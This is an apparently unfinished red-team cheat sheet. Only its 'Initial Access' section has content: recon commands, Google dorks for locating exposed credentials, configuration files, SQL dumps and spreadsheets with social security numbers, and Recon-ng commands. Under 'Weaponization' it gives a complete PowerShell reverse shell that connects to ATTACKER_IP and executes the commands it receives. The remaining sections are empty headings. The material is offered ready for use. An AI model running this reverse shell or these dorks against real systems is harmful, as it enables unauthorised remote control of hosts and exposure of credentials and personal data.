# Table Of Contents

1. [Initial Access](#initialaccess)
2. [Post Compromise](#postcompromise)
3. [Host Evasions](#hostevasions)
4. [Network Security Evasions](#networksecurityevasions)
5. [Compromising Active Directories](#compromisingad)

# I. Initial Access <a name="initialaccess"></a>

## Recon

### Built-in Tools

```
whois DOMAIN_NAME
nslookup DOMAIN_NAME
dig DOMAIN_NAME @DNS_SERVER
host DOMAIN_NAME
traceroute DOMAIN_NAME
```
### Google Dorking

Basic Search Operators
```
site:example.com
inurl:admin
intitle:"login page"
filetype:pdf
intext:"username"
cache:example.com
related:example.com
allinurl:login admin
allintitle:admin login
```

Common Google Dorks for Red Teamers
```
inurl:admin | inurl:login | inurl:dashboard
inurl:config filetype:xml OR filetype:ini OR filetype:txt
intext:password filetype:xls OR filetype:txt OR filetype:doc
filetype:sql intext:"INSERT INTO" OR intext:"sql dump"
intext:ssn OR intext:"social security number" filetype:xls
inurl:view/view.shtml
site:example.com intext:"vulnerability"
filetype:bak OR filetype:backup OR filetype:old OR filetype:zip
intitle:index.of "parent directory" site:example.com
inurl:ftp://
```

Advanced Dorks for More Targeted Recon
```
inurl:.git OR inurl:.git/config
intext:"@example.com" filetype:xls OR filetype:doc
inurl:.env OR inurl:wp-config.php
inurl:"ViewerFrame?Mode=" OR inurl:"axis-cgi"
```

Combining Dorks for Better Results
```
site:example.com filetype:log
intext:"default password" filetype:xls OR filetype:doc OR filetype:pdf
inurl:phpmyadmin OR inurl:mysql
```

### Recon-ng

```
workspaces create WORKSPACE_NAME
recon-ng -w WORKSPACE_NAME
db schema
db insert domains
marketplace search domains-
marketplace info MODULE
marketplace install MODULE
modules search
modules load MODULE
options list
options set OPTION VALUE
keys list
keys add KEY_NAME KEY_VALUE
keys remove KEY_NAME
run
```

## Weaponization

Powershell Reverse Shell
```
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2  = $sendback + "PS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()};
$client.Close()
```


# II. Post Compromise <a name="postcompromise"></a>

# III. Host Evasions <a name="hostevasions"></a>

# IV. Network Security Evasions <a name="networksecurityevasions"></a>

# V. Compromising Active Directories <a name="compromisingad"></a>
